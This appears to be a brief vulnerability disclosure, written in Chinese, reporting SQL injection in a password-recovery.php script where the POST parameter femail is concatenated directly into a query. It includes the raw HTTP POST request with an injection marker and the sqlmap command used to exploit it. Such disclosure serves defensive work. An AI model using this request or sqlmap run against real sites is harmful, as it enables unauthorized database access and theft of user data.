password-recovery.php文件中$femail直接拼接到sql语句中，而$femail是通过POST请求直接获取的


![alt text](password-recovery.php%20sql%20inject-1.png)


POST REQUEST

POST /password-recovery.php HTTP/1.1
Host: test.jc
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/x-www-form-urlencoded

send=aaa&femail=asd*

SQLmap run
sqlmap -r post.txt


![alt text](password-recovery.php%20sql%20inject-2.png)
